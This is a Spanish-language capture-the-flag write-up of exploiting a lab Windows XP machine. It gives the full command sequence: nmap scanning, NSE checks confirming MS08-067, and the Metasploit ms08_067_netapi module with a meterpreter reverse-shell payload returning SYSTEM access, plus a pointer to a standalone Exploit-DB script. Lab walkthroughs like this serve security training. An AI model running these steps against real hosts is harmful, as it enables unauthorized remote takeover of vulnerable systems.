// 01

Reconocimiento

1
CONECTAR LA VPN Y ESCANEAR
NMAP
$ sudo nmap -p- -n -Pn -sS --min-rate 3000 --max-retries 1 10.129.227.181
$ sudo nmap -p 135,139,445 -sV -n -Pn 10.129.227.181
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows XP microsoft-ds

// NOTA

Solo tres puertos, todos SMB/RPC, y un banner que delata Windows XP: un sistema sin soporte desde 2014, candidato directo a los boletines clásicos de SMB (MS08-067, MS17-010).

// 02

Confirmar MS08-067

2
SCRIPTS NSE DE VULNERABILIDAD

Antes de lanzar ningún exploit, nmap trae scripts que comprueban directamente si el boletín aplica, sin arriesgarse a tumbar el servicio con un intento a ciegas.

NMAP NSE
$ sudo nmap -p 139,445 --script smb-vuln-ms08-067,smb-vuln-ms17-010 10.129.227.181
| smb-vuln-ms08-067:
| VULNERABLE:
| Microsoft Windows system vulnerable to remote code execution (MS08-067)
|_smb-vuln-ms17-010: ERROR: Script execution failed (use -d to debug)

// MS08-067 (CVE-2008-4250)

Dónde: netapi32.dll, en la función que valida rutas UNC recibidas por RPC en el servicio Server.
Qué permite: una petición RPC malformada desborda un búfer en el montón y ejecuta código en el contexto del servicio — que corre como NT AUTHORITY\SYSTEM. MS17-010 (EternalBlue) no aplica a este XP: es un boletín posterior.

// 03

Explotación con Metasploit

3
LANZAR EL MÓDULO
METASPLOIT
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 > set RHOSTS 10.129.227.181
msf6 > set LHOST 10.10.16.12
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > exploit -j
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Meterpreter session 1 opened (10.10.16.12:4444 -> 10.129.227.181:1035)

// NOTA

El módulo detecta automáticamente el target (idioma y service pack) a partir del fingerprint SMB y ajusta el offset del exploit por sí solo — no hace falta elegirlo a mano.

4
CONFIRMAR PRIVILEGIOS Y LEER LAS FLAGS
METERPRETER
msf6 > sessions -i 1
meterpreter > getuid
meterpreter > cat "C:\Documents and Settings\john\Desktop\user.txt"
meterpreter > cat "C:\Documents and Settings\Administrator\Desktop\root.txt"
Server username: NT AUTHORITY\SYSTEM
[flag oculta] # user.txt
[flag oculta] # root.txt

// OJO: METASPLOIT POR SSH SIN TTY

sessions -i directo por SSH falla con Inappropriate ioctl for device (no hay terminal). Solución: lanzar msfconsole bajo script -qec "msfconsole -q -r fire.rc" /dev/null, que crea un pseudo-TTY, y enviar los comandos por su entrada estándar.

// FLAGS

user: [flag oculta] · root: [flag oculta]. No hace falta escalar: MS08-067 entrega ejecución como SYSTEM directamente desde el primer exploit.

5
ALTERNATIVA MANUAL

El mismo fallo está publicado en Exploit-DB como 40279.py: ajustando la IP objetivo y la shellcode de la reverse shell, se explota sin depender de Metasploit. Útil cuando no se quiere usar el framework, aunque aquí MSF es más rápido por la detección automática del target.

// 04

Referencia Comandos

smb-vuln-ms08-067 (NSE)
nmap -p 139,445 --script smb-vuln-ms08-067 <IP>
Comprueba de forma segura si el objetivo es vulnerable, sin disparar el exploit.
exploit/windows/smb/ms08_067_netapi
use exploit/windows/smb/ms08_067_netapi ; set RHOSTS/LHOST/PAYLOAD ; exploit
Módulo de Metasploit que explota MS08-067 y detecta automáticamente el target (idioma/SP) por fingerprint.
script (pseudo-TTY)
script -qec "comando" /dev/null
Da un pseudo-terminal a herramientas interactivas (como msfconsole) cuando se opera por SSH sin TTY real.

// 05

Glosario

MS08-067 (CVE-2008-4250)
Vulnerabilidad crítica de desbordamiento de búfer en el servicio Server de Windows (netapi32.dll), explotable sin autenticación. El mismo fallo que usó el gusano Conficker en 2008.
Servicio Server (SMB)
Servicio de Windows que implementa el protocolo SMB para compartir archivos e impresoras. Corre con privilegios de sistema, por lo que una RCE en él equivale a SYSTEM.
Meterpreter
Payload avanzado de Metasploit que ofrece una shell extensible (ficheros, procesos, pivoting...) en memoria, sin tocar el disco de la víctima más de lo necesario.
NT AUTHORITY\SYSTEM
La cuenta con más privilegios en un sistema Windows, por encima incluso del administrador local. Un servicio de sistema comprometido suele dar acceso directo a esta cuenta.
